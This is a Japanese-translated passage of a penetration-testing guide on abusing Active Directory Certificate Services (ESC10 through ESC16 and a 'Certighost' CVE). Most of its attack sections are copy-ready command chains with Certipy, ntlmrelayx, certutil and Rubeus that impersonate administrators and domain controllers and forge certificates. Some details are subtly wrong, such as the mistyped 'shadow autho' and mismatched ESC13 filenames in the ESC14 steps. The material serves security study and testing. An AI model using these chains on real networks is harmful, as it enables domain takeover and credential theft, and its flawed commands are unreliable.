**Case 2**

`CertificateMappingMethods` に `UPN` bit（`0x4`）が含まれている場合。

### Abuse Case 1

`StrongCertificateBindingEnforcement` が `0` に設定されている場合、`GenericWrite` permissionsを持つアカウントAを悪用して、任意のアカウントBをcompromiseできます。

たとえば、`Jane@corp.local` に対する `GenericWrite` permissionsを持っている場合、attackerは `Administrator@corp.local` のcompromiseを目指します。この手順はESC9と同じで、任意のcertificate templateを利用できます。

最初に、`GenericWrite` を悪用してShadow Credentialsで `Jane` のhashを取得します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、`Jane` の `userPrincipalName` は、制約違反を回避するために `@corp.local` の部分を意図的に省略して `Administrator` に変更されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
これに続いて、client authentication を有効にする certificate が、デフォルトの `User` template を使用して `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` はその後、元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
取得した証明書で認証すると、`Administrator@corp.local` の NT hash が得られます。証明書にはドメイン情報が含まれていないため、コマンドでドメインを指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 悪用ケース 2

`CertificateMappingMethods` に `UPN` ビットフラグ（`0x4`）が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B を侵害できます。これには、コンピューターアカウントや組み込みのドメイン管理者 `Administrator` も含まれます。

ここでは、`GenericWrite` を利用し、Shadow Credentials によって `Jane` の hash を取得した状態から、`DC$@corp.local` の侵害を目指します。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`の`userPrincipalName`は、`DC$@corp.local`に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
デフォルトの `User` template を使用し、`Jane` として client authentication 用の証明書を要求します。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` は、このプロセス後に元の値へ戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel経由で認証するには、Certipyの`-ldap-shell`オプションを使用し、`u:CORP\DC$`として認証に成功したことが示されます。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell を介して、`set_rbcd` などのコマンドにより Resource-Based Constrained Delegation (RBCD) attack を実行し、ドメインコントローラーを侵害できる可能性があります。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この vulnerability は、`userPrincipalName` がないユーザーアカウント、または `userPrincipalName` が `sAMAccountName` と一致しないユーザーアカウントにも及びます。デフォルトの `Administrator@corp.local` は、昇格された LDAP privileges を持ち、デフォルトでは `userPrincipalName` が存在しないため、主な target となります。

## Relaying NTLM to ICPR - ESC11

### 解説

CA Server が `IF_ENFORCEENCRYPTICERTREQUEST` を設定していない場合、RPC service 経由で signing なしの NTLM relay attacks を実行できます。[Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy` を使用して `Enforce Encryption for Requests` が Disabled かどうかを enumerate できます。Disabled の場合、certipy は `ESC11` Vulnerabilities を表示します。
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 悪用シナリオ

リレーサーバーをセットアップする必要があります：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注: domain controllers の場合、DomainController で `-template` を指定する必要があります。

または、[sploutchy's fork of impacket](https://github.com/sploutchy/impacket) を使用します:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".

USB device が CA server に USB port 経由で接続されている場合、または CA server が virtual machine の場合に USB device server を使用している場合、YubiHSM 内の keys を Key Storage Provider が生成・利用するために、authentication key（"password" と呼ばれることもあります）が必要です。

この key/password は、registry の `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に cleartext で保存されています。

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

shell access を取得した際に CA's private key が physical USB device に保存されている場合、その key を recover できます。

まず、CA certificate（これは public です）を取得し、その後:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最後に、certutil の `-sign` コマンドを使用して、CA 証明書とその秘密鍵から任意の新しい証明書を偽造します。

## OID Group Link Abuse - ESC13

### 説明

`msPKI-Certificate-Policy` 属性を使用すると、発行ポリシーを証明書テンプレートに追加できます。発行ポリシーを担当する `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナーの Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）内で検出できます。ポリシーは、このオブジェクトの `msDS-OIDToGroupLink` 属性を使用して AD グループにリンクできます。これにより、システムは証明書を提示したユーザーを、そのグループのメンバーであるかのように認証できます。[こちらのリファレンス](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。<sup>[[12]](#references)</sup>

つまり、ユーザーが証明書の enroll 権限を持っており、その証明書が OID グループにリンクされている場合、ユーザーはこのグループの権限を継承できます。

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用して OIDToGroupLink を見つけます：
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 悪用シナリオ

ユーザーが持つ権限を `certipy find` または `Certify.exe find /showAllPermissions` で確認します。

`John` が `VulnerableTemplate` に enroll する権限を持っている場合、そのユーザーは `VulnerableGroup` グループの権限を継承できます。

必要なのは template を指定することだけで、OIDToGroupLink 権限を持つ certificate を取得できます。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 脆弱な Certificate Renewal Configuration - ESC14

### 説明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping の説明は非常に詳細です。以下は原文からの引用です。<sup>[[14]](#references)</sup>

ESC14 は、主に Active Directory のユーザーまたはコンピューターアカウントにおける `altSecurityIdentities` 属性の誤用または安全でない設定によって発生する、「weak explicit certificate mapping」に起因する脆弱性を扱います。この複数値属性を使用すると、管理者は認証目的で X.509 証明書を AD アカウントに手動で関連付けることができます。この属性に値が設定されると、通常は証明書の SAN に含まれる UPN または DNS 名、あるいは `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張に埋め込まれた SID に依存するデフォルトの証明書マッピングロジックを、これらの明示的なマッピングが上書きできます。

`altSecurityIdentities` 属性内で証明書を識別するために使用される文字列値が広範すぎる、容易に推測できる、一意ではない証明書フィールドに依存している、または簡単に spoofing 可能な証明書コンポーネントを使用している場合、「weak」なマッピングが発生します。攻撃者が、特権アカウントに対してこのように weak に定義された明示的なマッピングと一致する証明書を取得または作成できる場合、その証明書を使用して対象アカウントとして認証し、なりすますことができます。

weak である可能性のある `altSecurityIdentities` マッピング文字列の例を以下に示します。

- 一般的な Subject Common Name (CN) のみによるマッピング: 例: `X509:<S>CN=SomeUser`。攻撃者は、より安全性の低いソースからこの CN を持つ証明書を取得できる可能性があります。
- 特定のシリアル番号や subject key identifier などによる追加の限定を行わず、過度に汎用的な Issuer Distinguished Name (DN) または Subject DN を使用する場合: 例: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 攻撃者が正当に取得または偽造できる証明書で満たせる可能性のある、その他の予測可能なパターンや暗号学的でない識別子を使用する場合（CA を侵害した場合や、ESC1 のような脆弱な template を発見した場合）。

`altSecurityIdentities` 属性は、次のようなさまざまなマッピング形式をサポートしています。

- `X509:<I>IssuerDN<S>SubjectDN`（完全な Issuer および Subject DN によるマッピング）
- `X509:<SKI>SubjectKeyIdentifier`（証明書の Subject Key Identifier 拡張値によるマッピング）
- `X509:<SR>SerialNumberBackedByIssuerDN`（Issuer DN によって暗黙的に限定されたシリアル番号によるマッピング） - これは標準的な形式ではなく、通常は `<I>IssuerDN<SR>SerialNumber` です。
- `X509:<RFC822>EmailAddress`（SAN の RFC822 name、通常はメールアドレスによるマッピング）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（証明書の raw public key の SHA1 ハッシュによるマッピング - 一般的に strong）

これらのマッピングの security は、マッピング文字列で使用される証明書識別子の具体性、一意性、および暗号学的強度に大きく依存します。Domain Controller で strong certificate binding mode が有効になっている場合でも（主に SAN の UPN/DNS および SID 拡張に基づく implicit mapping に影響します）、設定が不適切な `altSecurityIdentities` エントリは、マッピングロジック自体に欠陥がある、または許容範囲が広すぎる場合、なりすましへの直接的な経路となる可能性があります。
### Abuse Scenario

ESC14 は、Active Directory (AD) における **explicit certificate mapping**、具体的には `altSecurityIdentities` 属性を対象とします。この属性が（設計上または設定ミスによって）設定されている場合、攻撃者はマッピングと一致する証明書を提示することでアカウントになりすますことができます。

#### Scenario A: 攻撃者が `altSecurityIdentities` に書き込める場合

**Precondition**: 攻撃者が対象アカウントの `altSecurityIdentities` 属性への write permission、または対象 AD object に対して以下のいずれかの permission を付与する権限を持っていること:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: 対象が X509RFC822 (Email) による weak mapping を持つ場合

- **Precondition**: 対象の altSecurityIdentities に weak な X509RFC822 mapping が存在すること。攻撃者は被害者の mail 属性を対象の X509RFC822 name と一致するように設定し、被害者として certificate を enroll して、その certificate を使用して対象として認証できます。
#### Scenario C: 対象が X509IssuerSubject mapping を持つ場合

- **Precondition**: 対象の `altSecurityIdentities` に weak な X509IssuerSubject explicit mapping が存在すること。攻撃者は victim principal の `cn` または `dNSHostName` 属性を、対象の X509IssuerSubject mapping の subject と一致するように設定できます。その後、攻撃者は victim として certificate を enroll し、その certificate を使用して対象として認証できます。
#### Scenario D: 対象が X509SubjectOnly mapping を持つ場合

- **Precondition**: 対象の `altSecurityIdentities` に weak な X509SubjectOnly explicit mapping が存在すること。攻撃者は victim principal の `cn` または `dNSHostName` 属性を、対象の X509SubjectOnly mapping の subject と一致するように設定できます。その後、攻撃者は victim として certificate を enroll し、その certificate を使用して対象として認証できます。
### 具体的な操作
#### Scenario A

certificate template `Machine` の certificate を要求する
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
証明書を保存して変換する
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
（certificateを使用して）Authenticate
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
クリーンアップ（任意）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
より具体的な attack methods については、さまざまな attack scenarios に応じて、以下を参照してください: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc の説明は非常に詳細です。以下は原文からの引用です。<sup>[[15]](#references)</sup>

組み込みのデフォルト version 1 certificate templates を使用すると、攻撃者は CSR を作成し、template で指定された設定済みの Extended Key Usage attributes よりも優先される application policies を含めることができます。必要なのは enrollment rights のみであり、**_WebServer_** template を使用して、client authentication、certificate request agent、codesigning certificates を生成するために利用できます。

### Abuse

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) には、より詳細な使用例が記載されています。<sup>[[14]](#references)</sup>


Certipy の `find` command は、CA に patch が適用されていない場合に、ESC15 の影響を受ける可能性がある V1 templates の特定に役立ちます。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel経由の直接Impersonation

**Step 1: 「Client Authentication」Application Policyと対象UPNを挿入して証明書をリクエストする。** Attacker `attacker@corp.local`は、enrollee-supplied subjectを許可する「WebServer」V1 templateを使用して`administrator@corp.local`をターゲットにする。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 「Enrollee supplies subject」を設定した脆弱な V1 template。
- `-application-policies 'Client Authentication'`: CSR の Application Policies 拡張に OID `1.3.6.1.5.5.7.3.2` を挿入します。
- `-upn 'administrator@corp.local'`: なりすましのため、SAN に UPN を設定します。

**Step 2: 取得した証明書を使用して Schannel（LDAPS）経由で認証します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: Enrollment Agent Abuse による PKINIT/Kerberos Impersonation

**Step 1: 「Enrollee supplies subject」を設定した V1 template から、"Certificate Request Agent" Application Policy を注入して certificate をリクエストする。** この certificate は攻撃者（`attacker@corp.local`）が enrollment agent になるためのものです。ここでは攻撃者自身の identity に対する UPN は指定しません。目的は agent capability の取得だからです。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` を注入します。

**Step 2: "agent" certificate を使用して、対象の privileged user に代わって certificate を要求します。** これは ESC3 に類似した手順で、Step 1 の certificate を agent certificate として使用します。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Step 3: "on-behalf-of" 証明書を使用して、特権ユーザーとして認証する。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA で Security Extension が無効（グローバル）-ESC16

### 説明

**ESC16（szOID_NTDS_CA_SECURITY_EXT Extension の欠落による Elevation of Privilege）**とは、AD CS の設定で、すべての証明書に **szOID_NTDS_CA_SECURITY_EXT** extension を含めることが強制されていない場合に、攻撃者が以下の操作を実行できるシナリオを指します。

1. **SID binding なし**で証明書を要求する。

2. この証明書を使用して、任意のアカウントとして認証する。たとえば、Domain Administrator などの高い権限を持つアカウントになりすます。

詳細な原理については、次の記事も参照してください：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

詳細な使用方法については、[このリンク](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)を参照してください。<sup>[[14]](#references)</sup>

Active Directory Certificate Services（AD CS）環境が **ESC16** に対して脆弱かどうかを特定するには
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Step 1: 被害者アカウントの初期 UPN を読み取る（任意 - 復元用）。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**ステップ 2: 被害者アカウントの UPN を、対象管理者の `sAMAccountName` に更新します。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Step 3: （必要な場合）「victim」アカウントの認証情報を取得する（例：Shadow Credentials経由）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16-vulnerable CA 上の _any suitable client authentication template_（例: "User"）から、「victim」ユーザーとして証明書をリクエストします。** CA は ESC16 に対して脆弱なため、この拡張機能に関するテンプレート固有の設定にかかわらず、発行する証明書から SID security extension を自動的に省略します。Kerberos credential cache 環境変数を設定します（shell command）：
```bash
export KRB5CCNAME=victim.ccache
```
次に証明書を要求します：
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**ステップ5:「victim」アカウントのUPNを元に戻します。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Step 6: 対象の管理者として認証する。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 説明

**Certighost** は、CA が、発行される証明書に設定すべき identity を解決する際に、requester が指定した request attributes を信頼する **AD CS enrollment chase / callback path** を悪用します。公開 PoC では、細工した request に以下が含まれます:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA が接続する attacker-controlled host/IP
- **`rmd`**: impersonate する **target Domain Controller DNS name**

CA がこの chase に従うと、**SMB/LSA (`445`)** および **LDAP (`389`)** 経由で attacker に接続します。attacker は、callback session が有効な domain principal として認証されるように、**real machine account**（通常はデフォルトの **`ms-DS-MachineAccountQuota`** を利用して作成）を使います。しかし、rogue services は代わりに、以下の **target DC** の identity attributes を返します。

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA が、返された identity を認証済みの callback principal に暗号学的に bind していない場合、session が attacker-controlled machine account として認証されていても、**Domain Controller** 用の certificate を発行できます。このため、この bug は概念的に **Certifried** とは異なります。Certifried では `dNSHostName` などの AD attributes を書き換えるのに対し、attacker は **CA callback resolution 中に identity data を置き換えます**。<sup>[[2]](#references)</sup>

**有用な前提条件:**

- 低権限の **domain credentials**
- **computer account** を作成または再利用する能力
- **CA** から attacker-controlled な **ports `389` および `445`** への network reachability
- 脆弱または未適用の CA request path（**July 14, 2026** の Microsoft update により、**`cdc` に対する DC validation** と **resolved-SID comparison** が追加されました）

生成された **`.pfx`** は **PKINIT** に使用でき、**`.ccache`** と、公開 PoC flow では **target DC NT hash** を取得できます。これは通常、**full domain compromise** に十分です。

### 悪用

公開 PoC は chain 全体を自動化します:<sup>[[1]](#references)</sup>

1. attacker-controlled **machine account** を作成または再利用する。
2. `389` および `445` で **rogue LDAP and SMB/LSA listeners** を起動する。
3. attacker-controlled な **`cdc`** と target **`rmd`** attributes を含む certificate request を送信する。
4. CA が controlled machine account として rogue listeners に認証するのを待ち、identity lookups には **target DC** の attributes を返す。
5. CA-signed **DC certificate** を受け取り、それを **PKINIT** に使用する。
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoCで使用できる便利なruntime flags:

- `--listener <ip>`: `cdc` でadvertiseされるcallback IPを明示的に選択
- `--computer-name <NAME$>`: 新しいmachine accountを作成せず、既存のmachine accountを再利用

**Operational notes:**

- PoCは **privileged ports** `389` と `445` にbindするため、**root** が必要。
- Exploitationに成功すると、**DC `.pfx`** と **Kerberos `.ccache`** がローカルに書き込まれる。
- certificateは **Domain Controller account** にmapされるため、後続のactionsには **certificate-based Kerberos auth**、**DCSync**、および回収された **machine NT hash** の再利用などが含まれる。<sup>[[2]](#references)</sup>

## CertificatesによるForestのCompromisingをPassive Voiceで説明

### Compromised CAによるForest TrustのBreaking

**cross-forest enrollment** の設定は、比較的容易に行えるようにされている。resource forestの **root CA certificate** はadministratorsによって **account forests** に **published** され、resource forestの **enterprise CA** certificatesは各account forestの **`NTAuthCertificates` および AIA containers** に **added** される。明確にすると、この構成により、resource forestの **CA** には、PKIを管理する他のすべてのforestsに対する完全なcontrolが与えられる。このCAが **attackersによって compromised** された場合、resource forestとaccount forestsの両方に存在するすべてのusers用のcertificatesが彼らによって **forged** される可能性があり、それによってforestのsecurity boundaryがbreakingされる。<sup>[[6]](#references)</sup>

### Foreign Principalsに付与されるEnrollment Privileges

multi-forest environmentsでは、**Authenticated Users または foreign principals**（Enterprise CAが属するforestの外部にいるusers/groups）に **enrollment and edit rights** を許可する **certificate templates** を **publish** するEnterprise CAsについて、注意が必要となる。\
trustを越えてauthenticationが行われると、ADによって **Authenticated Users SID** がuserのtokenにaddedされる。そのため、あるdomainが **Authenticated Users enrollment rights** を許可するtemplateを持つEnterprise CAを備えている場合、別のforestのuserによってtemplateが **enrolled** される可能性がある。同様に、templateによって **enrollment rights** がforeign principalに明示的にgrantされている場合、**cross-forest access-control relationship** が作成され、その結果、あるforestのprincipalが別のforestのtemplateに **enroll** できるようになる。

どちらのscenarioも、あるforestから別のforestへ **attack surface** の増加をもたらす。certificate templateのsettingsは、foreign domainでadditional privilegesを取得するためにattackerによって exploitedされる可能性がある。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate ServicesのAbusing](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9、ESC10、BloodHound GUI、新しいAuthenticationおよびRequest Methodsなど](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account TakeoverのためのKey Trust Account MappingのAbusing](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usageの物語](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC経由でのAD Certificate ServicesへのRelaying](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSMを使用したADCS CAへのShell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Just Another AD CS ESCではない](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
